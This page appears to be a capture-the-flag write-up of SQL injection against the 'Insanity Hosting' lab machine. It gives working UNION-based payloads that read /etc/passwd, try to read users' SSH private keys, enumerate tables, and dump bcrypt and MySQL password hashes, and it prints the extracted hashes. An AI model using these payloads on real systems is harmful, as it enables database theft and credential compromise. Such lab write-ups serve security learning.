---
layout: default
title: SQLi Web UI
parent: SQL Injection
nav_order: 1
---

# SQLi Web UI

---

## Test for SQLi

The payload _" OR 1=1 -- -_ in the Title field results in successful SQLi and dumping the database.

![sql1](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/sql1.png)

![mail3](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail3.png)

The payload _" UNION SELECT null, @@version,null,null -- -_ successfully lists the database version.

![sql2](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/sql2.png)

![mail4](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail4.png)

The payload _" UNION SELECT null,LOAD_FILE('/etc/passwd'),null,null -- -_ successfully lists the database version.

![sql3](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/sql3.png)

![mail5](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail5.png)

## Try to list users _elliot_ or _nicholas_ RSA private key

The payload _" UNION SELECT null,LOAD_FILE('/home/nicholas/.ssh/id_rs'),null,null -- -_ for user _nicholas_

The payload _" UNION SELECT null,LOAD_FILE('/home/elliot/.ssh/id_rs'),null,null -- -_ for user _elliot_

Neither worked.

![mail6](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail6.png)

## Get user password hashes.

_Step 1_ | Get the table names

The payload _" UNION SELECT null,group_concat(table_name),null,null from information_schema.tables where table_schema = database() -- - _

![mail7](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail7.png)

We have table names: _hosts_, _log_, and _users_

_Step 2_ | Get the column names for the _users_ table

The payload _" UNION SELECT null,group_concat(column_name),null,null from information_schema.columns where table_schema = database() and table_name = 'users' -- - _

We have the columns: _id_, _username_, _password_, and _email_

![mail8](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail8.png)

_Step 3_ | Extract the records from the _users_ table.

The payload _" UNION SELECT null,group_concat(username,password,email),null,null from users -- - _

![mail9](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail9.png)

We get the following hashes back:

```bash
admin$2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cmaadmin@insanityhosting.vm

nicholas$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qenicholas@insanityhosting.vm

otis$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFWotis@insanityhosting.vm
```

Unable to get any to crack

## SQLi to Extract MySQL Users Table Records

While we could not get the hashes to crack from the _users_ table we will attempt to get the password hash from the _mysql.user_ table.

The payload " UNION SELECT null,group_concat(user,password,authentication_string),null,null from mysql.user -- -

![mail10](../../../../assets/images/ctfs/proving_grounds/insanity_hosting/mail10.png)

We get the following hashes:

```bash
root*CDA244FF510B063DA17DFF84FF39BA0849F7920F
elliot*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
```
